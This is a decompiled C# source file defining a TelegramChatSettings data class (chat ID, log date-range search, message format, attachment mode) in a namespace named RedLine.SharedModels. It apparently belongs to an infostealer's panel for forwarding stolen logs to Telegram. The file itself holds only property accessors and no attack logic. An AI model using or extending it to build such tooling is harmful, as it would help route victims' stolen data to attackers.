using System;
using System.Runtime.CompilerServices;

namespace RedLine.SharedModels;

public class TelegramChatSettings
{
	[CompilerGenerated]
	private long long_0;

	[CompilerGenerated]
	private object object_0 = new SingleSearchParams
	{
		LogFrom = DateTime.MinValue,
		LogTo = DateTime.MaxValue
	};

	[CompilerGenerated]
	private object object_1;

	[CompilerGenerated]
	private SendingMode sendingMode_0 = SendingMode.NoAttachments;

	public long ChatId
	{
		[CompilerGenerated]
		get
		{
			return long_0;
		}
		[CompilerGenerated]
		set
		{
			long_0 = value;
		}
	}

	public SingleSearchParams SearchParams
	{
		[CompilerGenerated]
		get
		{
			return (SingleSearchParams)object_0;
		}
		[CompilerGenerated]
		set
		{
			object_0 = value;
		}
	}

	public string MessageFormat
	{
		[CompilerGenerated]
		get
		{
			return (string)object_1;
		}
		[CompilerGenerated]
		set
		{
			object_1 = value;
		}
	}

	public SendingMode SendingMode
	{
		[CompilerGenerated]
		get
		{
			return sendingMode_0;
		}
		[CompilerGenerated]
		set
		{
			sendingMode_0 = value;
		}
	}
}
